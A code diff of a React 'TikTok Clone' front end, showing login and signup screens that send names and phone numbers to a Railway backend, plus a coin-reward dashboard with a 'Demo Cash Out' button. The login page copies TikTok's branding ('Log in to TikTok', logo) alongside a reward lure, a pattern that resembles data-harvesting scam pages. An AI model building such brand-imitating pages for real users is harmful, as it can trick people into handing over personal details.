@@ -3,29 +3,28 @@ import logo from "./assets/tiktok-logo.png";
 import "./App.css";
 
 // ============================================================
-// RAILWAY BACKEND API
+// BACKEND API
 // ============================================================
 
-const API_URL =
-  import.meta.env.VITE_API_URL || "https://tiktok-api.up.railway.app";
+const API_URL = "https://tiktok-api-com.up.railway.app";
 
 function App() {
   // ============================================================
-  // LOGIN STATES
+  // LOGIN
   // ============================================================
 
   const [loginUsername, setLoginUsername] = useState("");
   const [loginPhone, setLoginPhone] = useState("");
 
   // ============================================================
-  // SIGNUP STATES
+  // SIGN UP
   // ============================================================
 
   const [signupUsername, setSignupUsername] = useState("");
   const [signupPhone, setSignupPhone] = useState("");
 
   // ============================================================
-  // GENERAL STATES
+  // GENERAL
   // ============================================================
 
   const [message, setMessage] = useState("");
@@ -36,13 +35,7 @@ function App() {
 
   // ============================================================
   // PHONE VALIDATION
-  //
-  // Must:
-  // - start with 09
-  // - contain exactly 11 digits
-  //
-  // Example:
-  // 09123456789
+  // Example: 09123456789
   // ============================================================
 
   const validatePhone = (phone) => {
@@ -62,18 +55,10 @@ function App() {
     const username = signupUsername.trim();
     const phone = signupPhone.trim();
 
-    // ----------------------------------------------------------
-    // CHECK NAME
-    // ----------------------------------------------------------
-
     if (!username) {
       setMessage("Please enter your name.");
       return;
     }
-
-    // ----------------------------------------------------------
-    // CHECK PHONE
-    // ----------------------------------------------------------
 
     if (!validatePhone(phone)) {
       setMessage(
@@ -82,14 +67,8 @@ function App() {
       return;
     }
 
-    // ----------------------------------------------------------
-    // SEND SIGNUP REQUEST TO RAILWAY BACKEND
-    // ----------------------------------------------------------
-
     try {
       setLoading(true);
-
-      console.log("Sending signup request to:", `${API_URL}/api/signup`);
 
       const response = await fetch(`${API_URL}/api/signup`, {
         method: "POST",
@@ -102,42 +81,31 @@ function App() {
         }),
       });
 
-      // --------------------------------------------------------
-      // READ RESPONSE
-      // --------------------------------------------------------
-
       const data = await response.json();
 
-      console.log("Signup HTTP status:", response.status);
       console.log("Signup response:", data);
-
-      // --------------------------------------------------------
-      // SUCCESS
-      // --------------------------------------------------------
 
       if (response.ok && data.success) {
         setMessage("Account created successfully! You can now log in.");
 
-        // Put name into login
+        // Automatically put the information into login
         setLoginUsername(username);
-
-        // Put phone into login
         setLoginPhone(phone);
 
         // Clear signup fields
         setSignupUsername("");
         setSignupPhone("");
 
-        // Go to login page
+        // Go to login
         setTimeout(() => {
           setScreen("login");
           setMessage("");
-        }, 1200);
+        }, 1000);
       } else {
         setMessage(data.message || "Registration failed.");
       }
     } catch (error) {
-      console.error("SIGNUP ERROR:", error);
+      console.error("Signup error:", error);
 
       setMessage("Cannot connect to the server. Please try again.");
     } finally {
@@ -158,18 +126,10 @@ function App() {
     const username = loginUsername.trim();
     const phone = loginPhone.trim();
 
-    // ----------------------------------------------------------
-    // CHECK NAME
-    // ----------------------------------------------------------
-
     if (!username) {
       setMessage("Please enter your name.");
       return;
     }
-
-    // ----------------------------------------------------------
-    // CHECK PHONE
-    // ----------------------------------------------------------
 
     if (!validatePhone(phone)) {
       setMessage(
@@ -178,61 +138,43 @@ function App() {
       return;
     }
 
-    // ----------------------------------------------------------
-    // SEND LOGIN REQUEST TO RAILWAY BACKEND
-    // ----------------------------------------------------------
-
     try {
       setLoading(true);
 
-      console.log("Sending login request to:", `${API_URL}/api/login`);
-
       const response = await fetch(`${API_URL}/api/login`, {
         method: "POST",
-
         headers: {
           "Content-Type": "application/json",
         },
-
         body: JSON.stringify({
           username: username,
           phone: phone,
         }),
       });
 
-      // --------------------------------------------------------
-      // READ RESPONSE
-      // --------------------------------------------------------
-
       const data = await response.json();
 
-      console.log("Login HTTP status:", response.status);
       console.log("Login response:", data);
-
-      // --------------------------------------------------------
-      // SUCCESS
-      // --------------------------------------------------------
 
       if (response.ok && data.success) {
         // Save user
         localStorage.setItem("user", JSON.stringify(data.user));
 
-        // Save JWT token
+        // Save token
         if (data.token) {
           localStorage.setItem("token", data.token);
         }
 
-        // Save user in React
+        // React state
         setUser(data.user);
 
-        // Get coins
+        // Coins
         setCoins(data.user.coins ?? 5000);
 
         // Clear login fields
         setLoginUsername("");
         setLoginPhone("");
 
-        // Clear message
         setMessage("");
 
         // Open dashboard
@@ -241,7 +183,7 @@ function App() {
         setMessage(data.message || "Name and phone number do not match.");
       }
     } catch (error) {
-      console.error("LOGIN ERROR:", error);
+      console.error("Login error:", error);
 
       setMessage("Cannot connect to the server. Please try again.");
     } finally {
@@ -263,7 +205,6 @@ function App() {
     setLoginPhone("");
 
     setCoins(5000);
-
     setMessage("");
 
     setScreen("login");
@@ -282,14 +223,12 @@ function App() {
   };
 
   // ============================================================
-  // SIGNUP PAGE
+  // SIGNUP SCREEN
   // ============================================================
 
   if (screen === "signup") {
     return (
       <div className="tiktok-page">
-        {/* HEADER */}
-
         <header className="header">
           <div className="logo">
             <img src={logo} alt="TikTok Clone" />
@@ -297,8 +236,6 @@ function App() {
 
           <div className="help">? &nbsp; Feedback and help</div>
         </header>
-
-        {/* SIGNUP */}
 
         <main className="login-container">
           <h1>Create an account</h1>
@@ -313,7 +250,6 @@ function App() {
               placeholder="Name"
               value={signupUsername}
               onChange={(e) => setSignupUsername(e.target.value)}
-              autoComplete="name"
               required
             />
 
@@ -332,7 +268,6 @@ function App() {
               }}
               maxLength={11}
               inputMode="numeric"
-              autoComplete="tel"
               required
             />
 
@@ -343,11 +278,7 @@ function App() {
             </button>
           </form>
 
-          {/* MESSAGE */}
-
           {message && <div className="message">{message}</div>}
-
-          {/* LOGIN LINK */}
 
           <button
             className="forgot"
@@ -359,8 +290,6 @@ function App() {
             Already have an account? Log in
           </button>
         </main>
-
-        {/* FOOTER */}
 
         <footer className="footer">
           <div className="signup">
@@ -392,8 +321,6 @@ function App() {
   if (screen === "dashboard") {
     return (
       <div className="dashboard-page">
-        {/* HEADER */}
-
         <header className="dashboard-header">
           <div className="dashboard-logo">
             <img src={logo} alt="TikTok Clone" />
@@ -408,11 +335,7 @@ function App() {
           </div>
         </header>
 
-        {/* DASHBOARD */}
-
         <main className="dashboard-content">
-          {/* WELCOME */}
-
           <section className="welcome-section">
             <h1>
               Welcome
@@ -424,8 +347,6 @@ function App() {
               experience.
             </p>
           </section>
-
-          {/* REWARD CARD */}
 
           <section className="reward-card">
             <div className="reward-icon">🪙</div>
@@ -446,8 +367,6 @@ function App() {
               Demo Cash Out
             </button>
           </section>
-
-          {/* VIDEO SECTION */}
 
           <section className="video-section">
             <h2>For You</h2>
@@ -480,8 +399,6 @@ function App() {
           </section>
         </main>
 
-        {/* BOTTOM NAVIGATION */}
-
         <nav className="bottom-nav">
           <button className="nav-item active">
             🏠
@@ -510,13 +427,11 @@ function App() {
   }
 
   // ============================================================
-  // LOGIN PAGE
+  // LOGIN SCREEN
   // ============================================================
 
   return (
     <div className="tiktok-page">
-      {/* HEADER */}
-
       <header className="header">
         <div className="logo">
           <img src={logo} alt="TikTok Clone" />
@@ -524,8 +439,6 @@ function App() {
 
         <div className="help">? &nbsp; Feedback and help</div>
       </header>
-
-      {/* LOGIN */}
 
       <main className="login-container">
         <h1>Log in to TikTok</h1>
@@ -542,7 +455,6 @@ function App() {
             placeholder="Name"
             value={loginUsername}
             onChange={(e) => setLoginUsername(e.target.value)}
-            autoComplete="name"
             required
           />
 
@@ -561,7 +473,6 @@ function App() {
             }}
             maxLength={11}
             inputMode="numeric"
-            autoComplete="tel"
             required
           />
 
@@ -572,12 +483,8 @@ function App() {
           </button>
         </form>
 
-        {/* MESSAGE */}
-
         {message && <div className="message">{message}</div>}
       </main>
-
-      {/* FOOTER */}
 
       <footer className="footer">
         <div className="signup">
